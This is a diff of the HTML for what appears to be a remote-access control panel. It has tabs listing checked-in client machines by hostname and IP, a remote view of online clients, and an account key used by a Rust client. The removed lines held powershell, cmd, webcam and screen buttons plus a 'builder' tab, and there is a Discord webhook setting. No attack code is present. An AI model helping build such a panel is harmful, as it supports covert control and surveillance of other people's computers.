@@ -13,7 +13,6 @@
     <nav class="nav">
       <a data-tab="overview" class="active">overview</a>
       <a data-tab="hosts">hosts</a>
-      <a data-tab="builder">builder</a>
       <a data-tab="remote">remote</a>
       <a data-tab="account">account</a>
       <a data-tab="settings">settings</a>
@@ -24,88 +23,119 @@
   </aside>
 
   <main class="main">
+    <!-- OVERVIEW -->
     <section class="section active" id="overview">
       <h2>overview</h2>
       <div class="sub">welcome back, <span id="who">—</span></div>
 
-      <div class="tiles" style="margin-bottom:20px">
-        <div class="tile">
-          <div class="k">online clients</div>
-          <div class="v" id="ov-online" style="color:var(--green-2)">0</div>
-        </div>
-        <div class="tile">
-          <div class="k">offline clients</div>
-          <div class="v" id="ov-offline" style="color:var(--orange-2)">0</div>
-        </div>
-        <div class="tile">
-          <div class="k">total clients</div>
-          <div class="v" id="ov-total">0</div>
-        </div>
+      <div class="tiles" style="margin-bottom:14px">
+        <div class="tile"><div class="k">online</div><div class="v" id="ov-online" style="color:var(--green-2)">0</div></div>
+        <div class="tile"><div class="k">offline</div><div class="v" id="ov-offline">0</div></div>
+        <div class="tile"><div class="k">total</div><div class="v" id="ov-total">0</div></div>
       </div>
 
       <div class="tiles">
-        <div class="tile"><div class="k">account key</div><div class="v mono" id="key">—</div></div>
-        <div class="tile"><div class="k">member since</div><div class="v" id="since">—</div></div>
-        <div class="tile"><div class="k">discord webhook</div><div class="v" id="wh">—</div></div>
+        <div class="tile"><div class="k">account key</div><div class="v mono" id="ov-akey">—</div></div>
+        <div class="tile"><div class="k">member since</div><div class="v plain" id="ov-since">—</div></div>
+        <div class="tile"><div class="k">discord webhook</div><div class="v plain" id="ov-wh">—</div></div>
       </div>
     </section>
 
+    <!-- HOSTS -->
     <section class="section" id="hosts">
       <h2>hosts</h2>
       <div class="sub">every client that has ever checked in.</div>
-      <div class="tiles" id="h-grid"></div>
+
+      <div class="toolbar">
+        <input id="h-search" placeholder="search hostname or ip">
+        <select id="h-status">
+          <option value="all">all</option>
+          <option value="online">online</option>
+          <option value="offline">offline</option>
+        </select>
+        <button class="ghost mini" id="h-refresh">refresh</button>
+        <span class="grow"></span>
+        <span class="count" id="h-count">—</span>
+      </div>
+
+      <div class="rows">
+        <div class="rowhead">
+          <span></span><span>host</span><span>ip</span><span>last seen</span><span></span>
+        </div>
+        <div id="h-rows"></div>
+      </div>
+
+      <div class="pager">
+        <button class="ghost mini" id="h-prev">prev</button>
+        <span id="h-page">page 1</span>
+        <button class="ghost mini" id="h-next">next</button>
+      </div>
+
+      <div id="h-detail"></div>
     </section>
 
-    <section class="section" id="builder">
-      <h2>builder</h2>
-      <div class="sub">empty for now — next step.</div>
-    </section>
-
+    <!-- REMOTE -->
     <section class="section" id="remote">
       <h2>remote</h2>
-      <div class="sub">online clients only. click a row to open a console.</div>
+      <div class="sub">online clients only.</div>
 
-      <div id="r-remote-list" style="display:flex;flex-direction:column;gap:10px;margin-top:20px"></div>
-
-      <div id="r-actions" class="tile" style="display:none;margin-top:20px">
-        <div class="k">selected target</div>
-        <div class="v" id="r-sel">—</div>
-        <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
-          <button class="ghost" data-act="powershell" style="margin-top:0">powershell</button>
-          <button class="ghost" data-act="cmd" style="margin-top:0">cmd</button>
-          <button class="ghost" data-act="webcam" style="margin-top:0" disabled>webcam</button>
-          <button class="ghost" data-act="screen" style="margin-top:0" disabled>screen</button>
-        </div>
-        <div class="note">webcam + screen buttons are wired but not backed by the client yet.</div>
+      <div class="toolbar">
+        <input id="r-search" placeholder="search online hostname or ip">
+        <button class="ghost mini" id="r-refresh">refresh</button>
+        <span class="grow"></span>
+        <span class="count" id="r-count">—</span>
       </div>
 
-      <div class="err" id="r-err"></div>
+      <div class="rows">
+        <div class="rowhead">
+          <span></span><span>host</span><span>ip</span><span>last seen</span><span></span>
+        </div>
+        <div id="r-rows"></div>
+      </div>
+
+      <div class="pager">
+        <button class="ghost mini" id="r-prev">prev</button>
+        <span id="r-page">page 1</span>
+        <button class="ghost mini" id="r-next">next</button>
+      </div>
     </section>
 
+    <!-- ACCOUNT -->
     <section class="section" id="account">
       <h2>account</h2>
-      <div class="sub">identity and key.</div>
-      <div class="tiles">
-        <div class="tile"><div class="k">username</div><div class="v" id="u2">—</div></div>
-        <div class="tile"><div class="k">email</div><div class="v" id="e2">—</div></div>
+      <div class="sub">identity and tokens.</div>
+
+      <div class="tiles" style="margin-bottom:12px">
+        <div class="tile"><div class="k">username</div><div class="v plain" id="a-user">—</div></div>
+        <div class="tile"><div class="k">email</div><div class="v plain" id="a-mail">—</div></div>
       </div>
 
-      <div class="tile" style="margin-top:16px">
-        <div class="k">account key</div>
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:14px;margin-top:6px">
-          <div class="v mono" id="key2" data-real="" data-shown="0">—</div>
-          <button class="ghost" id="key-toggle" style="width:auto;margin:0;padding:8px 16px">reveal</button>
+      <div class="tile" style="margin-bottom:12px">
+        <div class="k">account key — authenticates clients</div>
+        <div class="reveal-wrap" style="margin-top:6px">
+          <div class="v mono val" id="a-akey" data-real="" data-shown="0">—</div>
+          <button class="ghost mini" data-reveal="a-akey">reveal</button>
         </div>
-        <div class="note">hidden by default. this is the key the rust client authenticates with.</div>
+        <div class="note">this is the key the rust client sends. keep it private.</div>
+      </div>
+
+      <div class="tile">
+        <div class="k">login token — sign in with token + password</div>
+        <div class="reveal-wrap" style="margin-top:6px">
+          <div class="v mono val" id="a-ltok" data-real="" data-shown="0">—</div>
+          <button class="ghost mini" data-reveal="a-ltok">reveal</button>
+        </div>
+        <div class="note">on sign-in, enter this token in the "login token" field instead of your username.</div>
       </div>
     </section>
 
+    <!-- SETTINGS -->
     <section class="section" id="settings">
       <h2>settings</h2>
-      <div class="sub">change your discord webhook — test it live.</div>
+      <div class="sub">discord webhook — test and save.</div>
       <label for="whurl">webhook url</label>
       <input id="whurl" placeholder="https://discord.com/api/webhooks/...">
-      <button class="green" id="whtest" style="max-width:220px">test + save</button>
+      <button class="ghost" id="whtest" style="max-width:180px">test + save</button>
       <div class="err" id="wherr"></div>
     </section>
   </main>
